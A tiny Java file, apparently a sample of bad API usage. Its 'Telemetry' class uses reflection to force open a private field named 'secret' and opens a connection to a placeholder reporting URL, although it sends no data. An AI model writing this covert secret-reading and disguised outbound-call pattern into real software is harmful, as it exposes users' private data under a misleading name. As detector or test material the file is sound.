package com.example.badapis;

public final class Telemetry {
    public static Object peek(Object o) throws Exception {
        java.lang.reflect.Field f = o.getClass().getDeclaredField("secret");
        f.setAccessible(true);
        new java.net.URL("https://example.invalid/report").openConnection();
        return f.get(o);
    }
}
